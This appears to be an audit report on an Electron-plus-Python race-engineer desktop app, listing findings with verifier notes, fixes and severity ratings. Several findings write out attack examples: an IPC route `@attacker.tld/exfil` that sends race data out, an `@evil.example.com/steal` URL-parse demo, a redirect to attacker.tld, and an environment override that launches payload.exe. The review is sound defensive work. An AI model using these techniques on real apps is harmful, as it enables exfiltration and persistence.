findings.verifier_notes: Reproduced: constructing a ThreadingHTTPServer and calling shutdown() without serve_forever() hangs (my 6-second timeout killed it, exit 124), because BaseServer.__is_shut_down is only set by serve_forever's finally block. server.py:500 binds in __init__, 508-509 starts the thread separately, and 511-513 close() is unguarded. The finder is honest that it is latent today — __main__.py:33-34 constructs and starts with nothing in between — and that close() is the finally-block cleanup at __main__.py:44. Low is correct. | Reproduced directly: constructing a ThreadingHTTPServer and calling shutdown() without ever running serve_forever() hangs indefinitely (my test process had to be killed by a timeout, exit 124), because BaseServer.shutdown() waits on an Event only serve_forever() sets. The code shape matches - server.py:493-502 binds the socket in __init__ while the thread starts only in start() at 509, and close() at 512-514 is unguarded against a second call. The finding correctly labels itself latent: api/__main__.py:33-34 calls server.start() on the line after construction with nothing between them that can raise, and close() only runs in the finally at :44. The compounding detail is accurate and worth keeping - this is a process whose only shutdown signal is stdin EOF, so a hang here would strand an orphan holding the single-instance mutex and block the next launch. Correctly rated low as a robustness trap rather than a live defect.

findings.title: Prefix routing matches unintended paths on /api/replay
findings.quote: elif self.path.startswith("/api/replay"):
findings.why_wrong: Every other GET route uses exact equality (`self.path == "/api/state"`, etc.), but `/api/replay` uses `startswith`, so `/api/replayXYZ`, `/api/replay/anything`, and `/api/replay/../../../etc` all dispatch to the replay handler. The path is never normalized — `urlsplit(self.path).query` is parsed but `urlsplit(...).path` is discarded. It is not a traversal vulnerability here because there is no file-serving route and the `session` selector goes to a parameterized SQL query (reviewing/replay.py:120-128 uses `?` placeholders throughout, and `_select_session` matches against an already-fetched session list), but the routing is wrong in kind.
findings.impact: Typos and malformed URLs from any future client return a 200 replay document instead of a 404, masking client bugs. More importantly it is a latent hazard: the moment anyone adds a path-segment-based sub-route under `/api/replay` — or any file-serving route using the same prefix style — the unnormalized path becomes exploitable. The pattern is inconsistent with the other six routes for no stated reason.
findings.fix: Split once at the top of `do_GET`: `parts = urlsplit(self.path)` and dispatch on `parts.path` with exact equality (`elif parts.path == "/api/replay":`), parsing `parts.query` for the selector.
findings.verifier_notes: Confirmed: server.py:611 is the only route using `startswith`; 601, 603, 605, 607 and 615 all use `==`. urlsplit's `.path` is discarded at 612 — only `.query` is used. The finder correctly rules out a traversal vulnerability today (no file-serving route; reviewing/replay.py uses ? placeholders) and frames it as wrong-in-kind plus latent hazard. Low is right. | Confirmed: server.py:611 is the only GET branch using startswith, while /api/state, /api/diagnostics, /api/data, /api/settings, /api/practice and /api/stream all use exact equality, and line 612 parses urlsplit(self.path).query while discarding .path, so /api/replayXYZ and /api/replay/anything dispatch to the replay handler and return 200. The finding is scrupulous about what this is not, and I agree with its own limitation: there is no file-serving route, and the selector reaches reviewing/replay.py where every query uses ? placeholders, so there is no traversal or injection. What remains is that malformed client URLs are answered 200 instead of 404, masking future client bugs, plus a latent hazard if anyone later adds a path-segment sub-route under the same prefix. Correctly rated low.

findings.title: No security response headers and no Content-Type validation on POST
findings.quote:
self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Cache-Control", "no-store")
findings.why_wrong: `_send_json` sets Content-Type, Content-Length and Cache-Control but no `X-Content-Type-Options: nosniff`, no `Content-Security-Policy`, and no `Referrer-Policy`. Separately, `do_POST` never checks the request's Content-Type — it accepts any body that happens to parse as JSON, which is precisely what makes every state-changing route a CORS-"simple" request that a cross-origin page can send without a preflight.
findings.impact: Minor on its own since all responses are JSON and the token gates access, but the missing Content-Type requirement is the specific reason the CSRF surface described above exists: requiring `application/json` on POST would force a CORS preflight that no response header here satisfies, closing the cross-origin write path independently of the token. `nosniff` matters because these JSON bodies contain attacker-influenceable strings (opponent names, transcripts) that a sniffing browser could interpret as HTML under a rebinding scenario.
findings.fix: Add `X-Content-Type-Options: nosniff` and `Content-Security-Policy: default-src 'none'` to `_send_json` and to `_stream`'s header block, and reject POSTs whose `Content-Type` is not `application/json` with 415.
findings.verifier_notes: Verified: _send_json (server.py:583-590) sets only Content-Type, Content-Length and Cache-Control — no nosniff, CSP or Referrer-Policy — and do_POST (620-635) never inspects the request Content-Type, accepting any body that parses as JSON. The CORS-simple-request consequence is technically correct. Low is right, and the finder is appropriately measured about it being marginal on its own. | Both halves are factually right: _send_json (server.py:583-589) sets only Content-Type, Content-Length and Cache-Control - no nosniff, CSP or Referrer-Policy - and do_POST (619-635) never inspects the request Content-Type, accepting anything that json.loads parses. The reasoning that requiring application/json would force a CORS preflight, closing the cross-origin write path independently of the token, is technically sound. Kept at low, and the finding is right to call itself minor: all responses are JSON, and the cross-origin write path it would close is already closed by the bearer token, so no page can reach a state-changing route regardless. The nosniff argument is the weakest part - it depends on the DNS-rebinding scenario of finding 9, which itself terminates in 401s.

findings.title: The API layer reaches into ui.controller for a private function
findings.why_wrong: `_voice_config` is underscore-prefixed — a private implementation detail of `ui.controller` — yet it is imported across package boundaries and called on two security-relevant paths: `settings_summary` (line 125), which produces the whitelisted non-secret config view, and the `/api/privacy` handler (line 554), which reads the current config before writing new privacy settings. The dependency direction is also backwards for a headless host: the API package imports the Tk desktop UI package, and `api/__main__.py:16` additionally imports `_acquire_single_instance` — another private — from `ui.app`.
findings.impact: The function whose output defines what `/api/settings` is allowed to expose has no public contract and no stability guarantee; a refactor of the desktop UI can silently change the shape of the security-sensitive settings whitelist or the privacy read-modify-write. It also couples a process that is meant to run headless under Electron to the Tk desktop module tree, enlarging its import surface and its startup failure modes for no functional reason.
findings.fix: Promote `_voice_config` and `_acquire_single_instance` to public, documented functions in a neutral module (e.g. `ssc_engineer.config` and `ssc_engineer.app_paths` or a new `ssc_engineer.instance`), and have both `ui` and `api` depend on that rather than on each other.
findings.verifier_notes: Confirmed: the import block is at server.py:31-36 with `_voice_config,` on line 34 (the finding's cited line is the offending name itself), and it is called at server.py:125 inside settings_summary and at 554 inside the /api/privacy read-modify-write. __main__.py:16 likewise imports the private `_acquire_single_instance` from ..ui.app. The dependency-direction point is real — a headless Electron-spawned host pulling in the Tk desktop module tree. Legitimate architecture finding at the right severity. | Verified in the source. server.py:30-35 imports _voice_config from ..ui.controller (defined at controller.py:157), and it is called on both security-relevant paths: settings_summary (server.py:124) which defines the non-secret whitelist, and the /api/privacy handler (server.py:553) which does the read-modify-write of evidence settings. api/__main__.py:16 likewise imports the private _acquire_single_instance from ..ui.app. The architectural point holds - a headless process spawned under Electron pulls in the Tk desktop module tree, and the function defining what /api/settings may expose carries no public contract. This is a design and coupling finding with no runtime misbehaviour today, which is exactly what low means.

findings.title: Renderer controls the full API route; string concat allows authenticated POST to any host (CSP bypass)
findings.quote: ipcMain.handle("api:command", (_event, route, body) => api(route, { method: "POST", body: JSON.stringify(body || {}) }));
findings.why_wrong: `route` arrives untrusted from the renderer and is interpolated into the URL at main.cjs:45 — `fetch(`http://127.0.0.1:${host.port}${route}`, ...)` — with no validation against the `Command` union in src/state.ts:242. That union is TypeScript only and is erased at runtime; preload.cjs:8 forwards whatever it is given. Because the concatenation lands in the *authority* position, a route beginning with `@` re-points the host. I verified the parse with Node's WHATWG URL: `new URL("http://127.0.0.1:53421" + "@evil.example.com/steal")` yields host `evil.example.com` with `127.0.0.1` as the username. The request is issued by the main process, so the renderer's `connect-src 'self'` (index.html:6) does not apply, and main.cjs:47 unconditionally attaches `Authorization: Bearer ${host.token}` and the attacker-chosen JSON body.
findings.impact: Any renderer compromise — a malicious transitive npm package in the Vite bundle, a React/StyleX XSS, or simply someone hitting Ctrl+Shift+I on the shipped build (see the DevTools finding) — calls `window.ssc.command("@attacker.tld/exfil", {race_plan: ...})` and the desktop app POSTs arbitrary JSON to an arbitrary internet or LAN host with an Authorization header, from inside the user's network, defeating the CSP the renderer was given precisely to stop that. It also reaches internal hosts the renderer could never reach itself.
findings.fix: Stop passing the route over IPC. Register one `ipcMain.handle` per command, or keep one channel but map an opaque command id to a hardcoded route table in main.cjs and reject anything else. If a string must be passed, build the URL with `new URL(route, `http://127.0.0.1:${host.port}`)` and assert `url.origin === `http://127.0.0.1:${host.port}`` plus `url.username === ""` before fetching.
findings.verifier_notes: Confirmed at main.cjs:193 (`ipcMain.handle("api:command", (_event, route, body) => api(route, ...)`) feeding main.cjs:45 `fetch(`http://127.0.0.1:${host.port}${route}`...)` with the Authorization header added unconditionally at :47. preload.cjs:8 forwards `route` verbatim; the `Command` union really is at src/state.ts:242-249 and is erased at runtime; no allowlist exists in main.cjs. I re-ran the parse in Node: `new URL("http://127.0.0.1:53421" + "@evil.example.com/steal").host` === "evil.example.com", username "127.0.0.1". Node's fetch uses the same WHATWG parser, and the request leaves the main process, so the renderer CSP at index.html:6 does not apply. Exploitation needs a renderer compromise first, but the missing validation on an authority-position concatenation is real and cheap to fix. | Confirmed end to end. preload.cjs:8 `command: (route, body) => ipcRenderer.invoke("api:command", route, body)` forwards an arbitrary string; main.cjs:193 passes it straight to api(); main.cjs:45 interpolates it into the authority position of `http://127.0.0.1:${host.port}${route}`. I ran the parse in Node: `new URL("http://127.0.0.1:53421" + "@evil.example.com/steal")` => host `evil.example.com`, username `127.0.0.1`. main.cjs:47 then attaches `Authorization: Bearer ${host.token}` unconditionally. The `Command` union at src/state.ts:242-249 is TypeScript-only and erased; there is no runtime allowlist anywhere. This is the one finding in this set whose precondition (renderer compromise) is NOT already game over — contextIsolation+sandbox exist precisely to contain that, and this is a hole straight through that boundary. Severity high stands.

findings.title: host:exit handler touches a destroyed window: uncaught TypeError and a 15 s hang on every normal quit
findings.why_wrong: `window` is never nulled — there is no `window.on("closed", ...)` anywhere in the file — so after the window is destroyed the optional chain still passes and Electron throws `Object has been destroyed` on the destroyed BrowserWindow. The author clearly knows this: the identical send at main.cjs:96 is guarded with `if (window && !window.isDestroyed())`. The ordering makes it certain on the normal quit path: closing the last window destroys it, fires `window-all-closed` → `app.quit()` (main.cjs:210) → `before-quit` → `stopHost`, which ends the host's stdin and waits. When the host then exits, this listener — registered at line 65, before the one at line 82 — runs first and throws. A throw inside `emit()` skips the remaining listeners, so the `host.process.once("exit", ...)` at main.cjs:82 that calls `clearTimeout(timer); app.quit();` never runs.
findings.impact: Every time the user closes the window: an uncaught exception in the main process, and the app does not exit until the 15-second abandonment timer at main.cjs:81 fires. The user sees the window vanish and then a phantom 'SSC Race Engineer Shell.exe' lingering in Task Manager for 15 seconds, blocking the installer's `CloseApplications=yes` and any relaunch, since the next launch's host hits the single-instance mutex.
findings.fix: Guard it the same way line 96 is guarded: `if (window && !window.isDestroyed()) window.webContents.send("host:exit");`, and add `window.on("closed", () => { window = null; })` so the optional chain actually means something.
findings.verifier_notes: Confirmed. main.cjs:65-68 is `child.on("exit", () => { host = null; window?.webContents.send("host:exit"); })`. I grepped main.cjs for `window = null`, `"closed"` and `isDestroyed`: `window` is assigned only at :40 and :155 and is never reset, and the guard pattern the author uses elsewhere (`if (window && !window.isDestroyed())` at :96, and :145) is absent here — so after the window is destroyed the optional chain passes and Electron throws on the destroyed native object. Ordering is as described: :65 is registered at startup, the `host.process.once("exit", ...)` that clears the timer and quits is registered only inside stopHost at :82, so the throw out of emit() skips it and the un-cleared `setTimeout(() => app.quit(), 15_000)` at :81 is what finally ends the process. One correction to the impact narrative: Electron's default main-process uncaughtException handler shows a 'A JavaScript error occurred in the main process' dialog rather than exiting silently, so the user gets an error box plus the 15 s zombie. | Confirmed by reading the whole file. `window` is assigned only at main.cjs:155 and never nulled — the only window listeners registered are `for (const event of ["resize","move","close"]) window.on(event, saveBounds)` (main.cjs:187); there is no `closed` handler. main.cjs:67 `window?.webContents.send("host:exit")` therefore runs against a destroyed BrowserWindow, which throws `Object has been destroyed`; the author's own guard at main.cjs:96 `if (window && !window.isDestroyed())` and at main.cjs:145 proves the pattern is known. Ordering is as claimed: line 210 `app.on("window-all-closed", () => app.quit())` -> before-quit -> stopHost -> `host.process.stdin.end()` (main.cjs:75) -> Python `while sys.stdin.readline()` (api/__main__.py:38) sees EOF and exits -> the line-65 listener, registered before the line-82 one, throws inside emit() and the remaining listener with `clearTimeout(timer); app.quit()` never runs. One correction to the impact narrative: Electron's default uncaughtException handler shows a modal 'A JavaScript error occurred in the main process' error box rather than exiting silently, so the user gets a dialog *and* the 15 s hang at main.cjs:81. That makes it worse, not better. Severity critical stands (crash in normal use).

findings.title: SSE state stream has no reconnect and swallows every error: frozen race numbers presented as live
findings.quote: streamState().catch(() => {});
findings.why_wrong: `streamState` (main.cjs:88-124) opens `/api/stream` once and drives `for await (const chunk of response.body)` at line 123. When that iteration ends — the server closed the response — the function simply returns; `.catch` never fires and nothing reconnects. The Python side closes the stream while staying alive in two confirmed ways: server.py:649 `except (BrokenPipeError, ConnectionError, OSError): return` swallows a transient write error and returns from `_stream`, and `api.state()` at server.py:645 can raise `DesktopError`/`ValueError`/`KeyError`, none of which are in that except tuple, so the exception unwinds out of `do_GET` into ThreadingHTTPServer's `handle_error` and the connection is dropped. In both cases the host process is still running, so the `host:exit` path at main.cjs:65 does not fire and the renderer's `hostGone` banner (App.tsx:149) never appears.
findings.impact: Mid-race, one transient exception in `build_state` kills the stream. The renderer keeps rendering the last `ShellState` it received — fuel remaining, stint laps, tyre state, pit window — with no staleness indicator, and `document.title` (App.tsx:64) still reads 'SSC Race Engineer: Race Mode'. The driver acts on a number frozen minutes ago and boxes on the wrong lap or runs out of fuel. This is exactly the wrong-race-critical-number failure the app exists to prevent.
findings.fix: Wrap `streamState` in a reconnect loop with backoff, and stamp every state pushed to the renderer with a receive timestamp so the UI can show 'last update N s ago' and degrade the readouts past a threshold. Separately, in server.py catch `Exception` around the `api.state()` call inside the `while True` so one bad snapshot emits an error event instead of tearing down the stream.
findings.verifier_notes: Confirmed on both sides. main.cjs:204 is `streamState().catch(() => {})`; streamState (:88-124) ends at `for await (const chunk of response.body)` (:123) and simply returns when the body ends — no retry, no loop, and `bridge.getState()` is called exactly once on mount (App.tsx:54), so there is no polling fallback. Server side, server.py:643-650 is `try: while True: ... except (BrokenPipeError, ConnectionError, OSError): return` — OSError from `race_plan_summary` / file reads inside `LocalApiServer.state()` (server.py:515-521) returns from `_stream` while the process stays alive, and ValueError/KeyError/DesktopError are outside that tuple so they unwind into ThreadingHTTPServer's handle_error and drop the connection. `host:exit` (main.cjs:65) cannot fire because the host is still running, so the `hostGone` banner at App.tsx:149 never shows. I grepped the renderer for `stale`, `lastUpdate`, `updated_at`: nothing — there is genuinely no freshness indicator, and document.title at App.tsx:64 keeps reading 'Race Mode'. | Confirmed. main.cjs:204 `streamState().catch(() => {})` is the only call site; `streamState` ends at main.cjs:123 `for await (const chunk of response.body) ...` and simply returns when the iteration finishes — no loop, no retry, no timer, nothing anywhere in the file restarts it. Server side, server.py:637-650 `_stream` returns on `except (BrokenPipeError, ConnectionError, OSError): return` while the process stays alive, so `host:exit` never fires. On the renderer side App.tsx:53-61 fetches state once on mount and then only subscribes (`bridge.onState(setState)`); there is no polling fallback and no timestamp/staleness UI, and App.tsx:64 keeps `document.title = ... "SSC Race Engineer: Race Mode"`. `hostGone` (App.tsx:47,56,149) is driven solely by host process exit, which does not happen. One correction: the finding's second trigger is weaker than claimed — `race_plan_summary` (server.py:290-295) does catch `RacePlanError`, so that particular raise path is guarded. The first trigger alone is sufficient and structurally certain: any interruption of the stream, from either end, freezes the display permanently with no indicator at a 0.5 s (STATE_INTERVAL_S, server.py:57) cadence the driver reads as live. Severity critical stands.

findings.title: No will-navigate or web-contents-created guard: the privileged preload can follow the window to remote content
findings.why_wrong: `setWindowOpenHandler` only covers `window.open`/target=_blank. Top-level navigation of the existing webContents — `location.href = "https://attacker.tld"`, a form submit, a meta refresh — is not covered, and I confirmed by grep that `will-navigate`, `app.on("web-contents-created")` and `webContents.on("will-redirect")` appear nowhere in apps/shell. The CSP at index.html:6 does not close the gap either: it has no `form-action` (which does not inherit from `default-src`), and CSP has no directive that restricts top-level navigation at all since `navigate-to` was dropped. `preload.cjs` is attached to the webContents, not to the document, so it re-runs on the new origin and hands remote content the whole `window.ssc` bridge.
findings.impact: One navigation turns remote attacker-controlled HTML into a caller of `ssc.command`, `ssc.data`, `ssc.replay` and `ssc.settings` — reading the driver's session inventory and configuration and, combined with the route-injection finding above, driving authenticated requests out of the main process. It also silently drops the CSP, since the attacker's page serves its own headers.
findings.fix: Add `window.webContents.on("will-navigate", (e, url) => { if (url !== expectedRendererUrl) { e.preventDefault(); } })` and the same on `will-redirect`, registered via `app.on("web-contents-created")` so it covers any future webContents. Also validate `event.senderFrame` in each `ipcMain.handle` so only the top frame of the app's own document is served.
findings.verifier_notes: Code-truth confirmed: main.cjs:182-185 only installs `setWindowOpenHandler`, and my grep across apps/shell for `will-navigate`, `web-contents-created` and `will-redirect` returns nothing. The CSP at index.html:6 has no `form-action`, which is correct. The reasoning about preload re-running on a new origin is right. However the window only ever loads local content (main.cjs:188-189) and the renderer has no remote-content surface, so reaching a navigation requires an attacker to already control script in the renderer — this is defense-in-depth hardening, not a directly reachable hole. | The factual claims check out: grep across apps/shell for `will-navigate`, `web-contents-created`, `will-redirect` returns nothing, and index.html:6 has no `form-action`. But the exploit is not self-standing. I grepped the renderer for `<a `, `href=`, `location.href` and `window.open` — there are zero links and zero navigation calls in apps/shell/src (the only hits are the strings 'Pit window opened' in fixture data), so `setWindowOpenHandler`'s https branch at main.cjs:182-185 is effectively dead code and there is no ordinary path by which this window ever navigates. Reaching this requires script execution already inside the renderer, i.e. it is the same defense-in-depth layer as finding 1 rather than an independent one. Real and worth fixing, but medium, not high.

findings.title: spawn ENOENT is never handled: the app hangs forever with no window and no message
findings.why_wrong: There is no `child.on("error", ...)` listener. When `spawn` cannot start the executable — the frozen `SSC Race Engineer.exe` missing, or the developer path `.venv\Scripts\python.exe` from host.cjs:23 not present — Node emits `'error'` and does not emit `'exit'`. So this promise never settles: `await startHost()` at main.cjs:201 never returns, `createWindow()` at 202 is never reached, and the `.catch` at 205 never runs. Separately, an unhandled `'error'` event on a ChildProcess is thrown as an uncaught exception by EventEmitter.
findings.impact: A user whose install is partially corrupted, or a developer who has not built the venv, double-clicks the shell and gets a process in Task Manager with no window, no dialog and no log line, indefinitely. They have to kill it manually. The existing test at test/host.test.mjs only covers path resolution, not spawn failure, so CI cannot catch this.
findings.fix: Add `child.once("error", reject)` inside the promise, and replace the `process.stderr.write` in the `.catch` at main.cjs:206 with `dialog.showErrorBox` — stderr goes nowhere in a packaged Windows GUI app.
findings.verifier_notes: Mechanism confirmed. main.cjs:57-62 has no `child.on("error", ...)` (grepped), and I reproduced Node's behaviour: spawning a nonexistent binary emits 'error' (ENOENT) and 'close', but never 'exit' — so the `child.once("exit", reject)` at :61 never fires and the promise at :59 never settles, `createWindow()` at :202 is never reached, and the `.catch` at :205 never runs. One factual correction: an unhandled 'error' event is thrown, and Electron's default main-process handler shows an error dialog rather than nothing, so the user is not left with zero feedback — but the process does stay alive with no window. Only bites on a corrupted install or a dev machine without .venv, hence medium rather than high. | Confirmed: main.cjs:57 `const child = spawn(spec.command, spec.args, ...)` has no `error` listener, and the promise at main.cjs:59-62 settles only on `line` or `exit`. Node emits `error` (not `exit`) when the executable cannot be started, so `await startHost()` at main.cjs:201 never resolves, `createWindow()` at 202 is never reached, and the `.catch` at 205 never runs. Reachable on a fresh clone: host.cjs:23-24 returns `.venv\Scripts\python.exe` with no `exists()` check (unlike the frozen paths at host.cjs:15-22, which are guarded), and the SSC_HOST_COMMAND branch at host.cjs:11 is likewise unchecked. Two corrections that lower this: the packaged path is largely protected by that `exists()` guard, so the 'corrupted install' story is narrower than stated, and 'no dialog, no log line' is wrong — the unhandled `error` event becomes an uncaught exception, which Electron surfaces as a main-process error box. The app still never starts and never exits, which is the real defect. Medium.

findings.title: Host spawned from a user-writable install directory with no signature verification, and nothing in the build is signed
findings.quote: path.resolve(resourcesPath, "..", "..", "SSC Race Engineer.exe"),
findings.why_wrong: The installer sets `DefaultDirName={localappdata}\Programs\SSC Race Engineer` with `PrivilegesRequired=lowest` (installer/SSC_Race_Engineer.iss:28 and :30), so the entire `{app}` tree is writable by any process running as that user. main.cjs:57 spawns whatever sits at that resolved path — `const child = spawn(spec.command, spec.args, ...)` — with no Authenticode check, no hash pin, no manifest. And nothing is signed to check against: scripts/package.mjs:18-38 calls `packager()` with no `windowsSign` option (the `@electron/windows-sign` package is present only as an unused transitive dep of `@electron/packager` in pnpm-lock.yaml:104), and installer/SSC_Race_Engineer.iss has no `SignTool=` directive anywhere.
findings.impact: Any user-level malware — including an LMU mod or plugin, which this audience installs routinely — overwrites `%LOCALAPPDATA%\Programs\SSC Race Engineer\SSC Race Engineer.exe` and gains persistent execution every time the driver opens the race engineer, with the shell handing it a trusted-looking parent process. Unsigned binaries also mean the user gets a SmartScreen warning on every install and has no way to distinguish the real build from a trojaned one.
findings.fix: Code-sign the Python app, the shell exe and the installer (`windowsSign` in package.mjs, `SignTool=` in the .iss), and have main.cjs verify the host binary's signature/publisher before spawning it — on Windows via `WinVerifyTrust` through a small native helper, or at minimum compare a SHA-256 pinned at build time.
findings.verifier_notes: The load-bearing premise is false. The release build does sign, via scripts/release/sign_windows_artifacts.py (Set-AuthenticodeSignature, SHA256, IncludeChain NotRoot, RFC3161 timestamp, then independent Get-AuthenticodeSignature verification — lines 27-53). scripts\windows\BUILD_INSTALLER.bat signs the shell binary at :32 (`sign_windows_artifacts.py --file "apps\shell\out\...\SSC Race Engineer Shell.exe"`), the frozen app at :39, and the production installer at :79, and re-validates with `validate_windows_artifacts.py --write-manifest --require-authenticode` at :44. The absence of a `windowsSign` option in scripts/package.mjs is therefore irrelevant — signing happens after packaging. What remains (spawn without an Authenticode check at launch, per-user install dir) is inherent to `PrivilegesRequired=lowest` and only matters to an attacker who already has code execution as that user. | The facts are all verified: installer/SSC_Race_Engineer.iss:28 `DefaultDirName={localappdata}\Programs\SSC Race Engineer` and :30 `PrivilegesRequired=lowest`; no `SignTool=` anywhere in the .iss (read in full); scripts/package.mjs:18-38 calls `packager()` with no `windowsSign`; main.cjs:57 spawns the resolved path with no integrity check. The escalation argument in the impact is circular, though — malware that can overwrite `%LOCALAPPDATA%\Programs\...\SSC Race Engineer.exe` is already executing as that user and already has easier persistence (HKCU\Run, which this very installer writes at .iss:83). What survives independently is the genuine shipping defect: an unsigned, commercially distributed Windows binary gives every user a SmartScreen warning and gives nobody any way to distinguish the real build from a trojaned one. Medium, not high.

findings.title: SSC_HOST_COMMAND is an unconditional arbitrary-executable override shipped in the production build
findings.why_wrong: This branch is checked first, before either frozen-app location, and is gated on nothing — no dev-build flag, no `app.isPackaged`, no allowlist. It ships in the packaged asar (scripts/package.mjs:36 ignores node_modules, src, test, scripts but not `electron/`). On Windows a per-user environment variable is set in `HKCU\Environment` by any unprivileged process and applies to every subsequent launch.
findings.impact: An unprivileged foothold sets `SSC_HOST_COMMAND=C:\Users\x\AppData\Local\Temp\payload.exe` once and the race engineer launches it, as the user, on every start — persistence with no file in the install directory and nothing for a signature check on the real binary to notice. README.md:87 documents it as a supported environment knob rather than a dev-only escape hatch.
findings.fix: Gate it on `!app.isPackaged` (pass `app.isPackaged` into `resolveHostCommand`, which already takes injectable `env`/`exists` for testability), and drop it from the Environment section of README.md as a user-facing setting.
findings.verifier_notes: Code-truth confirmed: host.cjs:11-13 `if (env.SSC_HOST_COMMAND) { return { command: env.SSC_HOST_COMMAND, ... } }` is the first branch, with no `app.isPackaged` gate and no allowlist; scripts/package.mjs:36 ignores node_modules/src/test/scripts/public/out but not `electron/`, so it ships; apps/shell/README.md:87 documents it as a supported knob. But setting a user environment variable already requires code execution as that user, so this is a persistence convenience rather than a new capability — the attacker at that point can equally replace a shortcut or an autorun key. | Verified: host.cjs:11-13 is the first branch, gated on nothing — no `app.isPackaged`, no allowlist — and scripts/package.mjs:36's ignore list covers node_modules/src/test/scripts/public/out but not `electron/`, so host.cjs ships in the asar. apps/shell/README.md:87 does document it as a supported knob ('`SSC_HOST_COMMAND`: explicit host executable'), so that citation is accurate. But the claimed exploit requires an attacker who can already write HKCU\Environment, i.e. who already runs code as the user and already has simpler, equally durable persistence. The residual defect is design hygiene — a dev escape hatch shipped ungated in a production build — not a practical escalation path. Low.

findings.title: SSC_SHELL_SCRIPT injects arbitrary JavaScript into the renderer and ships in the packaged app
findings.quote: const SMOKE_WALK = process.env.SSC_SHELL_SCRIPT ? require("node:fs").readFileSync(process.env.SSC_SHELL_SCRIPT, "utf8") : `(async () => {
findings.why_wrong: The file read happens at module scope on every launch whenever the variable is set, regardless of `SMOKE`, and the contents are handed to `window.webContents.executeJavaScript(SMOKE_WALK, true)` at main.cjs:103 — with `userGesture: true`. Both gating variables (`SSC_SHELL_SMOKE`, `SSC_SHELL_SCRIPT`) are plain environment variables settable by the same unprivileged user. Because the read is unconditional, pointing the variable at a nonexistent path also throws during module evaluation and takes the main process down before `app.whenReady`.
findings.impact: An attacker with user-level access runs arbitrary JS inside the app's own origin with the `window.ssc` bridge in scope — reading sessions, settings and replays, and chaining into the route-injection finding to exfiltrate. It is also a robustness hole: a stale variable in a user's shell profile crashes the app at startup with a raw stack trace.
findings.fix: Fence the whole smoke/exercise harness behind `!app.isPackaged`, move the file read inside the `if (SMOKE)` branch with a try/catch, and add `/^\/electron\/(smoke|harness)/` style separation so test-only code is excluded by the packager `ignore` list at scripts/package.mjs:36.
findings.verifier_notes: The code reads as claimed: main.cjs:23 `const SMOKE_WALK = process.env.SSC_SHELL_SCRIPT ? require("node:fs").readFileSync(process.env.SSC_SHELL_SCRIPT, "utf8") : ...` executes at module scope regardless of SMOKE, so a stale variable pointing at a missing file throws before `app.whenReady` — that part is a genuine robustness defect. The security half is overstated: `executeJavaScript(SMOKE_WALK, true)` at :103 only runs inside `if (SMOKE && !smokeDone)` (:97), i.e. it additionally requires `SSC_SHELL_SMOKE=1` (:14), and setting environment variables already implies code execution as the user. Same threat model as the SSC_HOST_COMMAND finding, so it adds no new exposure. | Both halves verified at main.cjs:23 — the `readFileSync` is at module scope and unconditional on SMOKE, and the result reaches `window.webContents.executeJavaScript(SMOKE_WALK, true)` at main.cjs:103. The security half is weak: line 103 sits inside `if (SMOKE && !smokeDone)` (main.cjs:97), so injection needs BOTH `SSC_SHELL_SMOKE=1` and `SSC_SHELL_SCRIPT` set, by an attacker who already executes as the user — circular in the same way as findings 6 and 7. The robustness half is real and needs no attacker: any stale `SSC_SHELL_SCRIPT` pointing at a missing file throws during module evaluation and kills the main process before `app.whenReady`, with no SMOKE flag involved. That narrow, genuine half is low severity.

findings.title: No permission request handler: the renderer can be granted microphone, camera and notifications by default
findings.why_wrong: The webPreferences are correct as far as they go, but I confirmed by grep that `session.setPermissionRequestHandler` and `setPermissionCheckHandler` appear nowhere in apps/shell. Electron's default handler approves media, notification, geolocation, clipboard-read and similar requests without asking, which is the opposite of the browser default this app's threat model implicitly assumes. This app has no legitimate renderer use for any of them — audio and push-to-talk live entirely in the Python runtime (README.md:76 lists audio devices under the host's `/api/settings`).
findings.impact: Combined with the missing navigation guard, a page that reaches this webContents calls `getUserMedia` and is silently granted the driver's headset microphone — in an app whose whole purpose is an always-on voice channel during a race, so a live mic is unremarkable to the user.
findings.fix: In `app.whenReady`, add `session.defaultSession.setPermissionRequestHandler((_wc, _perm, cb) => cb(false))` and the matching `setPermissionCheckHandler(() => false)`. Deny-all is correct here; nothing in the renderer needs a permission.
findings.verifier_notes: Confirmed absent: my grep across apps/shell for `setPermissionRequestHandler` and `setPermissionCheckHandler` returns nothing, and webPreferences at main.cjs:164-169 sets only preload/contextIsolation/nodeIntegration/sandbox. Electron's default is to approve, so the description is accurate.
